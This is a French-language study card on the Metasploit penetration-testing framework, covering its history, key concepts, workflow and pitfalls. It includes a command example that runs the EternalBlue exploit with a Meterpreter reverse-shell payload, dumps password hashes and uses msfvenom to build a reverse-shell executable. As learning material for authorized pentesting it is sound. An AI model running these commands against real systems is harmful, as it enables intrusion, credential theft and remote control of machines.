---
id: metasploit
label: Metasploit
category: logiciel
priority: high
status: learning
last_quiz_score: null
next_review: null
ease_factor: 2.5
interval: 1
createdAt: '2026-04-14T17:59:14.302Z'
updatedAt: '2026-04-14T17:59:14.302Z'
relations:
  - target: pentesting
    type: uses
    weight: 0.9
  - target: kali-linux
    type: uses
    weight: 0.8
resources:
  - type: documentation
    title: Metasploit – Documentation officielle
    url: 'https://docs.metasploit.com/'
  - type: documentation
    title: Rapid7 – Metasploit Framework
    url: 'https://www.rapid7.com/products/metasploit/'
  - type: vidéo
    title: HackerSploit – Metasploit for Beginners
    url: 'https://www.youtube.com/watch?v=8lR27r8Y_ik'
  - type: blog
    title: Offensive Security – Metasploit Unleashed
    url: 'https://www.offsec.com/metasploit-unleashed/'
  - type: cours
    title: TryHackMe – Metasploit Introduction
    url: 'https://tryhackme.com/room/metasploitintro'
---

## Résumé rapide

Metasploit est le framework d'exploitation le plus utilisé au monde. Il fournit une plateforme complète pour développer, tester et exécuter des exploits contre des systèmes cibles. Il est essentiel dans la boîte à outils de tout pentester professionnel.

---

## Définition

Metasploit Framework est un framework open source de test d'intrusion écrit en Ruby. Il permet de rechercher des vulnérabilités, de développer et d'exécuter des exploits, de générer des payloads et de maintenir un accès persistant sur les systèmes compromis. Il intègre une base de données de milliers d'exploits et de modules auxiliaires.

---

## Histoire

* Créé en 2003 par H.D. Moore en Perl
* Réécrit en Ruby en 2007 pour plus de modularité
* Acquis par Rapid7 en 2009
* Metasploit Community Edition lancée pour démocratiser l'outil
* Aujourd'hui plus de 2000 exploits et 1000 modules auxiliaires
* Toujours open source (Framework) avec des versions commerciales (Pro)

---

## Objectif

* Automatiser les tests d'intrusion
* Valider les vulnérabilités découvertes par les scanners
* Développer et tester des exploits personnalisés
* Générer des payloads pour différentes plateformes
* Documenter et reproduire les attaques dans un cadre d'audit

---

## Domaines d'utilisation

* Tests d'intrusion professionnels
* Recherche en sécurité offensive
* Validation de correctifs de sécurité
* Formation en cybersécurité (CTF, labs)
* Red Team operations

---

## Fonctionnement

* L'utilisateur sélectionne un **exploit** (code ciblant une vulnérabilité)
* Il choisit un **payload** (code exécuté après exploitation réussie)
* Il configure les **options** (cible, port, paramètres)
* Metasploit envoie l'exploit et, en cas de succès, déploie le payload
* Une session (Meterpreter, shell) est ouverte pour interagir avec la cible

```
  ┌───────────┐   Exploit    ┌───────────┐
  │ Metasploit│─────────────▶│  Cible    │
  │ Framework │              │ vulnérable│
  └───────────┘              └─────┬─────┘
       ▲                           │
       │      Payload/Session      │
       └───────────────────────────┘
         (Meterpreter, Shell, etc.)
```

---

## Concepts clés

* **Exploit** — Code qui tire parti d'une vulnérabilité spécifique
* **Payload** — Code exécuté sur la cible après l'exploitation (reverse shell, Meterpreter)
* **Meterpreter** — Payload avancé offrant un shell interactif riche en fonctionnalités
* **Module auxiliaire** — Scanner, fuzzer ou outil sans exploitation directe
* **Post-exploitation** — Actions après compromission (pivoting, élévation de privilèges)
* **Encoder** — Outil pour obfusquer le payload et échapper aux antivirus
* **Handler** — Listener qui attend la connexion retour du payload

---

## Exemple

```bash
# Démarrer Metasploit avec la base de données
sudo msfdb init
msfconsole

# Rechercher un exploit
msf6> search type:exploit platform:windows smb

# Sélectionner un exploit (exemple : EternalBlue)
msf6> use exploit/windows/smb/ms17_010_eternalblue

# Voir les options requises
msf6> show options

# Configurer la cible et le payload
msf6> set RHOSTS 192.168.1.100
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 192.168.1.50

# Lancer l'exploit
msf6> exploit

# Commandes Meterpreter après exploitation
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> upload /tmp/tool.exe C:\\temp\\tool.exe
meterpreter> shell

# Générer un payload standalone avec msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
```

---

## Avantages

* Framework complet couvrant tout le cycle d'un pentest
* Base de données massive d'exploits constamment mise à jour
* Meterpreter offre des capacités de post-exploitation avancées
* Extensible avec des modules Ruby personnalisés
* Intégration avec d'autres outils (Nmap, Nessus, Cobalt Strike)

---

## Inconvénients

* Les exploits publics sont souvent détectés par les antivirus
* Nécessite une bonne compréhension des systèmes et des réseaux
* La version open source manque de certaines fonctionnalités (rapports, automatisation)
* Peut être complexe pour les débutants
* Les exploits récents (0-day) ne sont généralement pas inclus

---

## Pièges courants

* Utiliser Metasploit sur des systèmes sans autorisation (illégal)
* Ne pas configurer correctement LHOST (l'IP de retour du payload)
* Oublier d'initialiser la base de données PostgreSQL
* Utiliser des payloads non encodés facilement détectés par les antivirus
* Confondre un exploit réussi avec un accès complet (élévation de privilèges souvent nécessaire)

---

## À ne pas confondre

* Metasploit Framework vs Metasploit Pro (open source vs commercial)
* Exploit vs Payload (l'exploit ouvre la porte, le payload entre)
* Metasploit vs Cobalt Strike (framework gratuit vs outil commercial de Red Team)
* Meterpreter vs reverse shell (shell avancé vs shell basique)

---

## Explication simplifiée

Metasploit, c'est comme un coffret de clés de crochetage pour un serrurier certifié. Il contient des milliers de « clés » (exploits) pour tester différentes « serrures » (vulnérabilités). Quand une clé fonctionne, le serrurier peut entrer et vérifier ce qu'un cambrioleur pourrait faire (post-exploitation).

---

## Explication avancée

Metasploit Framework repose sur une architecture modulaire en Ruby. Les exploits ciblent des vulnérabilités spécifiques (buffer overflow, injection, désérialisation) et délivrent des payloads via des stagers (petits codes qui téléchargent le payload complet) ou des singles (payload autonome). Meterpreter fonctionne entièrement en mémoire (fileless) et communique via un canal chiffré TLS. Le framework supporte le pivoting réseau (routage du trafic à travers une machine compromise), l'automatisation via des resource scripts, et l'intégration avec la base de données PostgreSQL pour stocker les résultats des scans et des exploitations. Les modules post-exploitation permettent l'extraction de credentials, le mouvement latéral et la persistance.

---

## Points critiques à retenir

* [CRITIQUE] N'utiliser Metasploit que dans un cadre légal avec autorisation écrite
* [CRITIQUE] Comprendre la différence entre exploit, payload et handler
* [IMPORTANT] Meterpreter est le payload le plus puissant mais aussi le plus détecté
* [IMPORTANT] Toujours initialiser la base de données pour conserver les résultats
* [PIÈGE] Ne pas oublier de configurer LHOST correctement
* [PIÈGE] Les exploits publics sont souvent détectés par les solutions de sécurité modernes
